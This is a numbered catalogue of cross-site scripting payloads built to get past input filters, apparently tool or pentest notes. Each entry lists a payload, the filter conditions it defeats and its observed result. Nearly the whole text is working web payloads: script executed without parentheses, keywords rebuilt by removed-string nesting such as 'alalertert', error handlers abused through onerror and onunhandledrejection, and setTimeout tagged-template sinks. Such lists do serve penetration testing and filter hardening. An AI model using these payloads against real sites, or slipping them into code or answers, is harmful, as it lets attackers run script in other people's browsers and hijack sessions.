1. XSS without Parentheses using Exception Handling
- Payload: <script>onerror=alert;throw 1</script>
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked but < > and semicolons are NOT encoded
- Case: When () is blocked, use onerror to assign alert as the error handler and throw an exception to trigger it without parentheses
- Output: <script>onerror=alert;throw 1</script>

---

2. XSS without Parentheses using Exception Handling no Semicolons
- Payload: <script>{onerror=alert}throw 1</script>
- Condition: Input is reflected into HTML where parentheses () and semicolons ; are filtered/blocked
- Case: Use block syntax to assign onerror and throw to trigger alert without () or ;
- Output: <script>{onerror=alert}throw 1</script>

---

3. XSS without Parentheses using Template Strings
- Payload: <script>alert`1`</script>
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked but backticks ` are NOT encoded
- Case: Use template literals (backticks) instead of parentheses to call alert
- Output: <script>alert`1`</script>

---

4. XSS without Parentheses using Location Redirect
- Payload: <script>location='javascript:alert\x281\x29'</script>
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked
- Case: Use \x28 and \x29 (hex encoded parentheses) inside a javascript: protocol URL to bypass the filter
- Output: <script>location='javascript:alert\x281\x29'</script>

---

5. XSS without Parentheses using Location Name
- Payload: <script>location=name</script>
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked
- Case: Use window.name to store the javascript: URL and redirect to it. Requires setting window.name first
- Output: <script>window.name='javascript:alert(1)';</script><svg onload=location=name>

---

6. XSS without Parentheses using Percent-Encoded Parens in javascript: URL
- Payload: location="javascript:alert%281%29"
- Condition: Input is reflected into HTML where parentheses () are filtered/blocked AND backslash \ is transformed (e.g. doubled to \\), killing the \x28 hex-escape variant from #4
- Case: When the browser navigates to a javascript: URL it percent-decodes the scheme body before executing it, so %28 %29 become ( ). This works inside any javascript:/data: URL sink (location assignment, href, iframe src) but NOT inside a plain <script> block where % is the modulo operator
- Output: location="javascript:alert%281%29"

---

7. XSS without Parentheses using Percent-Encoded or Concat-Masked Function Name
- Payload: location="javascript:%61lert%281%29"  or  location="javascript:al"+"ert%281%29"
- Condition: Same as #6, plus the dialog function name itself (alert/confirm/prompt) is stripped as a literal keyword
- Case: Two independent masks: (a) %61lert percent-encodes the 'a' so the literal "alert" never reaches the filter, while the browser decodes it back to alert during javascript: navigation; (b) "al"+"ert" concatenates two string literals at runtime so the blocked substring never appears contiguously — deterministic even if the filter re-runs until clean (unlike removed-string nesting which collapses if the filter loops). (b) also survives double-decoding filters that would expose %61lert
- Output: location="javascript:%61lert%281%29"

---

8. XSS when the Filter Re-encodes Percent Signs (% -> %25)
- Payload: "/autofocus/onfocus="throw/**/self.onerror=alalertert,1
- Condition: The filter maps every literal % to %25 (anti-encoding defense). All %-dependent channels die: %28%29 parens and %61lert name-masking produce %2528 / %2561 which the browser only decodes once, yielding a literal %28 / %61 in the javascript: body -> syntax error or modulo NaN. Also assume () -> double-encoded entities, \ -> \\, ` -> x, space/'/[]/{}/; stripped, and dialog names stripped (single-pass).
- Case: Abandon every %-channel and the location=javascript: sink entirely. The surviving primitive set ("/"=,+-* no whitespace needed) supports the exception-handling family: throw an error and let window.onerror=alert fire it. Rebuild the stripped keyword with removed-string nesting (al + alert + ert -> filter removes "alert" once -> alert), which is deterministic because str_replace does not loop. throw/**/ uses a block comment as a whitespace substitute when spaces are stripped; throw-0 throws -0 directly when / * are also tight.
- Output: "/autofocus/onfocus="throw/**/self.onerror=alalertert,1  or  "/autofocus/onfocus="throw-0,self.onerror=alalertert,1

---

9. XSS without Parentheses using a ReferenceError onerror Trigger
- Payload: "/autofocus/onfocus="self.onerror=alalertert,undefined_variable
- Condition: Same hostile profile as #8 — `throw`, `-`, `/`, spaces, `()`, backticks, `;`, `{}` may all be stripped — while `=`, `,`, `.` survive and a dialog name can be rebuilt (alalertert splitter) or survives outright
- Case: In an event-handler body (statement context) the comma is the comma *operator*, so `self.onerror=alert,undefined_variable` assigns the handler first, then evaluates an undefined identifier -> uncaught ReferenceError -> window.onerror -> alert(msg). Requires NO throw keyword, NO whitespace, NO parens — strictly more resilient than the throw-0 / throw-slash-star forms. In a `var q='…'` string context instead, wrap in declarators: `,w=self.onerror=alert,t=undefined_variable,z=` (each declarator needs `name=` — see "xss into javascript string" #5).
- Output: "/autofocus/onfocus="self.onerror=alert,undefined_variable -> FIRED: Uncaught ReferenceError: undefined_variable is not defined

---

10. Removed-String Split + `/**/` Junction Mask (two-layer filter defeat)
- Payload: '*alalertert/**/`1`*'   (inside var q='…')
- Condition: Filter strips the dialog name (`alert`) AND the call junction (`alert`1`` or `alert(1)`) as separate needles. Backtick survives; `/` survives; the comment probe `/* */` survives.
- Case: A bare `alalertert`1`` rebuild is filtered twice: needle 1 deletes the inner `alert` (al+ert -> alert`1`), then needle 2 deletes the literal `alert`1`` junction -> dead. Inserting `/**/` between the rebuilt name and the arg keeps `alert`1`` non-contiguous through BOTH filter passes — needle 2 never matches — while the browser discards the comment and still evaluates the tagged-template call. The same trick applies to parens arg when `(` survives: `alalertert/**/(1)`. Compose both bypass primitives: splitter rebuilds the name, `/**/` masks the junction.
- Output: <script>var q=''*alert/**/`1`*''</script> -> FIRED: dialog "1"

---

11. XSS via `onunhandledrejection` + `Promise.reject`
- Payload: "/autofocus/onfocus="self.onunhandledrejection=alalertert,Promise.reject(1)
- Condition: attr-handler statement context; `,` `=` `.` survive; `Promise.reject` + `(1)` or `Promise.reject`1`` survive
- Case: `self.onunhandledrejection=alert` installs the rejection handler, then `Promise.reject(1)` (or tagged `Promise.reject`1``) produces an unhandled rejection -> the handler fires with a PromiseRejectionEvent -> dialog. A second statement-side trigger when `throw` / `;` / ReferenceError identifiers are unavailable. In `var q='…'` wrap per-declarator: `,w=self.onunhandledrejection=alert,t=Promise.reject(1),z=`.
- Output: FIRED: dialog "[object PromiseRejectionEvent]"

12. Coercion Error Trigger — `{valueOf:NAME}` Illegal-Invocation TypeError
- Payload: "/autofocus/onfocus="self.onerror=alalertert,0*{valueOf:alalertert}
  or in var string: ',w=self.onerror=alert,t=0*{valueOf:alert},z='
- Condition: `,` `=` `.` `{` `}` `:` `*` (or `+`) survive and the dialog name is a bare identifier
- Case: `0*{valueOf:alert}` forces ToNumber(obj) -> calls `alert.call(obj)` -> native dialog functions fail the Web IDL `this` brand check -> TypeError "Illegal invocation" -> propagates to the just-assigned `self.onerror` -> alert("Uncaught TypeError: Illegal invocation"). With a shadowed/custom name the call runs directly instead — either path executes. IMPORTANT: never emit `0*{valueOf:alert}` standalone — without an onerror assignment the TypeError is uncaught and no dialog fires (verified dead in Chromium). Only viable when the name resolves to a *callable* (skip `"al"+"ert"` concat forms — a string valueOf is skipped, not called, so no error).
- Output: FIRED: dialog "Uncaught TypeError: Illegal invocation"

13. Tagged-Template Code Sinks — `setTimeout`STMT`` / `Function`STMT`()`
- Payload: "/autofocus/onfocus="eval`…`   -- WRONG; use:
  "/autofocus/onfocus="self.x=setTimeout`self.onerror=alalertert,undefined_variable`  (as attribute fn) or in js_raw: setTimeout`self.onerror=alert,undefined_variable`
- Condition: backtick survives and the sink name (`setTimeout`/`setInterval`/`Function`) is allowed; `Function` additionally needs `()` to invoke the built function
- Case: In a tagged template, the callee receives the template STRINGS ARRAY — `setTimeout`/`setInterval` coerce it to source text and schedule it (fires "Uncaught ReferenceError…" via onerror). `Function`code`()` coerces the array to the function body then `()` invokes it. `eval`STMT`` does NOT work: PerformEval returns a non-string argument unchanged, so the array never reaches the parser (verified dead).
- Output: FIRED: dialog "Uncaught ReferenceError: undefined_variable is not defined"

14. Entity-Encoded Whitespace After `throw`
- Payload: "/autofocus/onfocus="throw&#9;0,self.onerror=alalertert,1
- Condition: handler attribute context; `&#9;` `&#32;` `&Tab;` decode inside the attribute VALUE to a tab/space — a valid JS separator. Requires char-ref survival probes (entity_tab / entity_space / named_tab)
- Case: `throw<TAB>0` is legal JS (`throw` accepts any whitespace EXCEPT a LineTerminator — `&#10;`/`&NewLine;` decode to LF and are a `[no LineTerminator here]` SyntaxError, so those spellings must never be emitted after `throw`). The filter sees `throw&#9;0` — no literal space, no keyword junction.
- Output: FIRED: dialog "Uncaught 1" (throw value 1 caught by onerror -> alert(1))

